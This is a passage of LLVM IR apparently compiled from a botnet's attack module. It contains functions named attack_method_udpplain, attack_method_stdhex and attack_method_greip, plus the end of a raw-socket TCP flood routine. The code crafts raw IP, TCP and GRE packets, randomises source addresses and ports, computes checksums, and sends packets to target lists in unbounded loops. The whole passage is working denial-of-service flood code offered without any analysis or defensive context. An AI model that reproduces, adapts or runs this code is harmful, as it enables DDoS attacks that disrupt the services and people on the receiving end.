  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #7
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %64, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  br label %77

; <label>:64:                                     ; preds = %39
  %65 = call i32 @close(i32 %37) #7
  br label %227

.preheader.loopexit:                              ; preds = %96
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader128
  %66 = icmp eq i8 %0, 0
  %67 = icmp eq i32 %36, -1
  %68 = and i32 %11, 65535
  %69 = icmp eq i32 %68, 65535
  %70 = and i32 %17, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %19, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = icmp eq i32 %21, 65535
  %75 = icmp eq i32 %22, 65535
  %76 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:77:                                     ; preds = %.lr.ph130, %96
  %78 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %8, i64 %80
  store i8* %78, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %78, i64 20
  %83 = getelementptr inbounds i8, i8* %78, i64 40
  store i8 69, i8* %78, align 4
  %84 = getelementptr inbounds i8, i8* %78, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #8
  %86 = getelementptr inbounds i8, i8* %78, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #8
  %89 = getelementptr inbounds i8, i8* %78, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %78, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %77
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %94 = getelementptr inbounds i8, i8* %78, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %77, %92
  %97 = getelementptr inbounds i8, i8* %78, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %78, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %101, i32 1
  %103 = load i32, i32* %102, align 4
  %104 = getelementptr inbounds i8, i8* %78, i64 16
  %105 = bitcast i8* %104 to i32*
  store i32 %103, i32* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %18) #8
  %107 = bitcast i8* %82 to i16*
  store i16 %106, i16* %107, align 4
  %108 = call zeroext i16 @htons(i16 zeroext %20) #8
  %109 = getelementptr inbounds i8, i8* %78, i64 22
  %110 = bitcast i8* %109 to i16*
  store i16 %108, i16* %110, align 2
  %111 = call zeroext i16 @htons(i16 zeroext %46) #8
  %112 = zext i16 %111 to i32
  %113 = getelementptr inbounds i8, i8* %78, i64 24
  %114 = bitcast i8* %113 to i32*
  store i32 %112, i32* %114, align 4
  %115 = getelementptr inbounds i8, i8* %78, i64 32
  %116 = bitcast i8* %115 to i16*
  %117 = load i16, i16* %116, align 4
  %118 = and i16 %117, -16369
  %119 = or i16 %63, %118
  %120 = or i16 %119, 160
  store i16 %120, i16* %116, align 4
  %121 = getelementptr inbounds i8, i8* %78, i64 41
  store i8 2, i8* %83, align 1
  %122 = getelementptr inbounds i8, i8* %78, i64 42
  store i8 6, i8* %121, align 1
  %123 = call i32 @rand_next() #7
  %124 = and i32 %123, 15
  %125 = add nuw nsw i32 %124, 1458
  %126 = trunc i32 %125 to i16
  %127 = call zeroext i16 @htons(i16 zeroext %126) #8
  %128 = bitcast i8* %122 to i16*
  store i16 %127, i16* %128, align 2
  %129 = getelementptr inbounds i8, i8* %78, i64 44
  %130 = getelementptr inbounds i8, i8* %78, i64 45
  store i8 4, i8* %129, align 1
  %131 = getelementptr inbounds i8, i8* %78, i64 46
  store i8 2, i8* %130, align 1
  %132 = getelementptr inbounds i8, i8* %78, i64 47
  store i8 8, i8* %131, align 1
  %133 = getelementptr inbounds i8, i8* %78, i64 48
  store i8 10, i8* %132, align 1
  %134 = call i32 @rand_next() #7
  %135 = bitcast i8* %133 to i32*
  store i32 %134, i32* %135, align 4
  %136 = getelementptr inbounds i8, i8* %78, i64 52
  %137 = bitcast i8* %136 to i32*
  store i32 0, i32* %137, align 4
  %138 = getelementptr inbounds i8, i8* %78, i64 56
  %139 = getelementptr inbounds i8, i8* %78, i64 57
  store i8 1, i8* %138, align 1
  %140 = getelementptr inbounds i8, i8* %78, i64 58
  store i8 3, i8* %139, align 1
  %141 = getelementptr inbounds i8, i8* %78, i64 59
  store i8 3, i8* %140, align 1
  store i8 8, i8* %141, align 1
  %142 = load i32, i32* %5, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %5, align 4
  %144 = icmp slt i32 %143, %43
  br i1 %144, label %77, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %206
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %66, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %206
  %storemerge122129 = phi i32 [ %225, %206 ], [ 0, %.lr.ph.preheader ]
  %145 = sext i32 %storemerge122129 to i64
  %146 = getelementptr inbounds i8*, i8** %8, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to %struct.iphdr*
  %149 = getelementptr inbounds i8, i8* %147, i64 20
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %145, i32 2
  %151 = load i8, i8* %150, align 4
  %152 = icmp ult i8 %151, 32
  br i1 %152, label %153, label %168

; <label>:153:                                    ; preds = %.lr.ph
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %145, i32 1
  %155 = load i32, i32* %154, align 4
  %156 = call i32 @ntohl(i32 %155) #8
  %157 = call i32 @rand_next() #7
  %158 = load i32, i32* %5, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 2
  %161 = load i8, i8* %160, align 4
  %162 = zext i8 %161 to i32
  %163 = lshr i32 %157, %162
  %164 = add i32 %163, %156
  %165 = call i32 @htonl(i32 %164) #8
  %166 = getelementptr inbounds i8, i8* %147, i64 16
  %167 = bitcast i8* %166 to i32*
  store i32 %165, i32* %167, align 4
  br label %168

; <label>:168:                                    ; preds = %153, %.lr.ph
  br i1 %67, label %169, label %173

; <label>:169:                                    ; preds = %168
  %170 = call i32 @rand_next() #7
  %171 = getelementptr inbounds i8, i8* %147, i64 12
  %172 = bitcast i8* %171 to i32*
  store i32 %170, i32* %172, align 4
  br label %173

; <label>:173:                                    ; preds = %169, %168
  br i1 %69, label %174, label %179

; <label>:174:                                    ; preds = %173
  %175 = call i32 @rand_next() #7
  %176 = trunc i32 %175 to i16
  %177 = getelementptr inbounds i8, i8* %147, i64 4
  %178 = bitcast i8* %177 to i16*
  store i16 %176, i16* %178, align 4
  br label %179

; <label>:179:                                    ; preds = %174, %173
  br i1 %71, label %180, label %184

; <label>:180:                                    ; preds = %179
  %181 = call i32 @rand_next() #7
  %182 = trunc i32 %181 to i16
  %183 = bitcast i8* %149 to i16*
  store i16 %182, i16* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %180, %179
  br i1 %73, label %185, label %190

; <label>:185:                                    ; preds = %184
  %186 = call i32 @rand_next() #7
  %187 = trunc i32 %186 to i16
  %188 = getelementptr inbounds i8, i8* %147, i64 22
  %189 = bitcast i8* %188 to i16*
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %185, %184
  br i1 %74, label %191, label %195

; <label>:191:                                    ; preds = %190
  %192 = call i32 @rand_next() #7
  %193 = getelementptr inbounds i8, i8* %147, i64 24
  %194 = bitcast i8* %193 to i32*
  store i32 %192, i32* %194, align 4
  br label %195

; <label>:195:                                    ; preds = %191, %190
  br i1 %75, label %196, label %200

; <label>:196:                                    ; preds = %195
  %197 = call i32 @rand_next() #7
  %198 = getelementptr inbounds i8, i8* %147, i64 28
  %199 = bitcast i8* %198 to i32*
  store i32 %197, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %196, %195
  br i1 %76, label %206, label %201

; <label>:201:                                    ; preds = %200
  %202 = call i32 @rand_next() #7
  %203 = trunc i32 %202 to i16
  %204 = getelementptr inbounds i8, i8* %147, i64 38
  %205 = bitcast i8* %204 to i16*
  store i16 %203, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %200, %201
  %207 = getelementptr inbounds i8, i8* %147, i64 10
  %208 = bitcast i8* %207 to i16*
  store i16 0, i16* %208, align 2
  %209 = bitcast i8* %147 to i16*
  %210 = call zeroext i16 @checksum_generic(i16* %209, i32 20) #7
  store i16 %210, i16* %208, align 2
  %211 = getelementptr inbounds i8, i8* %147, i64 36
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 4
  %213 = call zeroext i16 @htons(i16 zeroext 40) #8
  %214 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %148, i8* %149, i16 zeroext %213, i32 40) #7
  store i16 %214, i16* %212, align 4
  %215 = getelementptr inbounds i8, i8* %147, i64 22
  %216 = bitcast i8* %215 to i16*
  %217 = load i16, i16* %216, align 2
  %218 = load i32, i32* %5, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %219, i32 0, i32 1
  store i16 %217, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %219, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* %147, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #7
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph, label %.loopexit.loopexit

; <label>:227:                                    ; preds = %4, %64
  ret void
}

declare zeroext i16 @checksum_generic(i16*, i32) local_unnamed_addr #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #7
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %20, label %23

; <label>:20:                                     ; preds = %4
  %21 = tail call i32 @rand_next() #7
  %22 = trunc i32 %21 to i16
  br label %26

; <label>:23:                                     ; preds = %4
  %24 = trunc i32 %13 to i16
  %25 = tail call zeroext i16 @htons(i16 zeroext %24) #8
  br label %26

; <label>:26:                                     ; preds = %23, %20
  %.058 = phi i16 [ %22, %20 ], [ %25, %23 ]
  %27 = zext i8 %0 to i32
  %28 = icmp eq i8 %0, 0
  br i1 %28, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %26
  %29 = and i32 %11, 65535
  %30 = icmp eq i32 %29, 65535
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = zext i8 %0 to i64
  br label %38

.preheader.loopexit:                              ; preds = %70
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %26
  %36 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %37 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:38:                                     ; preds = %.lr.ph62, %70
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %70 ]
  %39 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %40 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %39, i8** %40, align 8
  br i1 %30, label %41, label %44

; <label>:41:                                     ; preds = %38
  %42 = call i32 @rand_next() #7
  %43 = trunc i32 %42 to i16
  br label %46

; <label>:44:                                     ; preds = %38
  %45 = call zeroext i16 @htons(i16 zeroext %12) #8
  br label %46

; <label>:46:                                     ; preds = %44, %41
  %.sink = phi i16 [ %45, %44 ], [ %43, %41 ]
  %47 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %48 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %48, align 2
  %49 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %50 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %49, i32* %50, align 4
  %51 = icmp eq i32 %49, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %46
  ret void

; <label>:53:                                     ; preds = %46
  store i16 2, i16* %31, align 4
  store i16 %.058, i16* %32, align 2
  store i32 0, i32* %33, align 4
  %54 = load i32, i32* %50, align 4
  %55 = call i32 @bind(i32 %54, %struct.sockaddr* nonnull %34, i32 16) #7
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %57 = load i8, i8* %56, align 4
  %58 = icmp ult i8 %57, 32
  br i1 %58, label %59, label %70

; <label>:59:                                     ; preds = %53
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @ntohl(i32 %61) #8
  %63 = call i32 @rand_next() #7
  %64 = load i8, i8* %56, align 4
  %65 = zext i8 %64 to i32
  %66 = lshr i32 %63, %65
  %67 = add i32 %66, %62
  %68 = call i32 @htonl(i32 %67) #8
  %69 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %68, i32* %69, align 4
  br label %70

; <label>:70:                                     ; preds = %59, %53
  %71 = load i32, i32* %50, align 4
  %72 = bitcast %struct.attack_target* %47 to %struct.sockaddr*
  %73 = call i32 @connect(i32 %71, %struct.sockaddr* %72, i32 16) #7
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %74 = icmp slt i64 %indvars.iv.next, %35
  br i1 %74, label %38, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %36, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %75 = icmp eq i8 %16, 0
  %76 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %81
  %.160 = phi i32 [ %.mux, %81 ], [ 0, %.lr.ph.preheader ]
  %77 = sext i32 %.160 to i64
  %78 = getelementptr inbounds i8*, i8** %8, i64 %77
  %79 = load i8*, i8** %78, align 8
  br i1 %75, label %81, label %80

; <label>:80:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %79, i32 %76) #7
  br label %81

; <label>:81:                                     ; preds = %.lr.ph, %80
  %82 = getelementptr inbounds i32, i32* %10, i64 %77
  %83 = load i32, i32* %82, align 4
  %84 = call i64 @send(i32 %83, i8* %79, i64 %37, i32 16384) #7
  %85 = add nsw i32 %.160, 1
  %86 = icmp slt i32 %85, %27
  %brmerge = or i1 %86, %36
  %.mux = select i1 %86, i32 %85, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %81
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

declare void @rand_str(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #7
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %20, label %23

; <label>:20:                                     ; preds = %4
  %21 = tail call i32 @rand_next() #7
  %22 = trunc i32 %21 to i16
  br label %26

; <label>:23:                                     ; preds = %4
  %24 = trunc i32 %13 to i16
  %25 = tail call zeroext i16 @htons(i16 zeroext %24) #8
  br label %26

; <label>:26:                                     ; preds = %23, %20
  %.058 = phi i16 [ %22, %20 ], [ %25, %23 ]
  %27 = zext i8 %0 to i32
  %28 = icmp eq i8 %0, 0
  br i1 %28, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %26
  %29 = and i32 %11, 65535
  %30 = icmp eq i32 %29, 65535
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = zext i8 %0 to i64
  br label %38

.preheader.loopexit:                              ; preds = %71
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %26
  %36 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %37 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:38:                                     ; preds = %.lr.ph62, %71
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %71 ]
  %39 = call i32 @rand() #7
  %40 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %41 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %40, i8** %41, align 8
  br i1 %30, label %42, label %45

; <label>:42:                                     ; preds = %38
  %43 = call i32 @rand_next() #7
  %44 = trunc i32 %43 to i16
  br label %47

; <label>:45:                                     ; preds = %38
  %46 = call zeroext i16 @htons(i16 zeroext %12) #8
  br label %47

; <label>:47:                                     ; preds = %45, %42
  %.sink = phi i16 [ %46, %45 ], [ %44, %42 ]
  %48 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %49, align 2
  %50 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %51 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %50, i32* %51, align 4
  %52 = icmp eq i32 %50, -1
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %47
  ret void

; <label>:54:                                     ; preds = %47
  store i16 2, i16* %31, align 4
  store i16 %.058, i16* %32, align 2
  store i32 0, i32* %33, align 4
  %55 = load i32, i32* %51, align 4
  %56 = call i32 @bind(i32 %55, %struct.sockaddr* nonnull %34, i32 16) #7
  %57 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %58 = load i8, i8* %57, align 4
  %59 = icmp ult i8 %58, 32
  br i1 %59, label %60, label %71

; <label>:60:                                     ; preds = %54
  %61 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %62 = load i32, i32* %61, align 4
  %63 = call i32 @ntohl(i32 %62) #8
  %64 = call i32 @rand_next() #7
  %65 = load i8, i8* %57, align 4
  %66 = zext i8 %65 to i32
  %67 = lshr i32 %64, %66
  %68 = add i32 %67, %63
  %69 = call i32 @htonl(i32 %68) #8
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %69, i32* %70, align 4
  br label %71

; <label>:71:                                     ; preds = %60, %54
  %72 = load i32, i32* %51, align 4
  %73 = bitcast %struct.attack_target* %48 to %struct.sockaddr*
  %74 = call i32 @connect(i32 %72, %struct.sockaddr* %73, i32 16) #7
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %75 = icmp slt i64 %indvars.iv.next, %35
  br i1 %75, label %38, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %36, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %76 = icmp eq i8 %16, 0
  %77 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %82
  %.160 = phi i32 [ %.mux, %82 ], [ 0, %.lr.ph.preheader ]
  %78 = sext i32 %.160 to i64
  %79 = getelementptr inbounds i8*, i8** %8, i64 %78
  %80 = load i8*, i8** %79, align 8
  br i1 %76, label %82, label %81

; <label>:81:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %80, i32 %77) #7
  br label %82

; <label>:82:                                     ; preds = %.lr.ph, %81
  %83 = getelementptr inbounds i32, i32* %10, i64 %78
  %84 = load i32, i32* %83, align 4
  %85 = call i64 @send(i32 %84, i8* %80, i64 %37, i32 16384) #7
  %86 = add nsw i32 %.160, 1
  %87 = icmp slt i32 %86, %27
  %brmerge = or i1 %87, %36
  %.mux = select i1 %87, i32 %86, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %82
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %222, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #7
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %46, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = sext i32 %21 to i64
  %37 = add nsw i64 %36, 52
  %38 = trunc i64 %37 to i16
  %39 = icmp ne i8 %16, 0
  %40 = add nsw i64 %36, 28
  %41 = trunc i64 %40 to i16
  %42 = xor i16 %12, -1
  %43 = icmp eq i8 %25, 0
  %44 = add nsw i64 %36, 8
  %45 = trunc i64 %44 to i16
  br label %61

; <label>:46:                                     ; preds = %30
  %47 = call i32 @close(i32 %28) #7
  br label %222

.preheader.loopexit:                              ; preds = %114
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader125
  %48 = icmp eq i8 %0, 0
  %49 = icmp eq i32 %27, -1
  %50 = and i32 %11, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = and i32 %17, 65535
  %53 = icmp eq i32 %52, 65535
  %54 = and i32 %19, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = icmp eq i8 %25, 0
  %57 = icmp eq i8 %23, 0
  %58 = sext i32 %21 to i64
  %59 = add i32 %21, 8
  %60 = add nsw i64 %58, 52
  br label %.loopexit

; <label>:61:                                     ; preds = %.lr.ph127, %114
  %62 = call noalias i8* @calloc(i64 1458, i64 8) #7
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8*, i8** %8, i64 %64
  store i8* %62, i8** %65, align 8
  %66 = getelementptr inbounds i8, i8* %62, i64 24
  %67 = getelementptr inbounds i8, i8* %62, i64 44
  store i8 69, i8* %62, align 4
  %68 = getelementptr inbounds i8, i8* %62, i64 1
  store i8 %10, i8* %68, align 1
  %69 = call zeroext i16 @htons(i16 zeroext %38) #8
  %70 = getelementptr inbounds i8, i8* %62, i64 2
  %71 = bitcast i8* %70 to i16*
  store i16 %69, i16* %71, align 2
  %72 = call zeroext i16 @htons(i16 zeroext %12) #8
  %73 = getelementptr inbounds i8, i8* %62, i64 4
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 4
  %75 = getelementptr inbounds i8, i8* %62, i64 8
  store i8 %14, i8* %75, align 4
  br i1 %39, label %76, label %80

; <label>:76:                                     ; preds = %61
  %77 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %78 = getelementptr inbounds i8, i8* %62, i64 6
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  br label %80

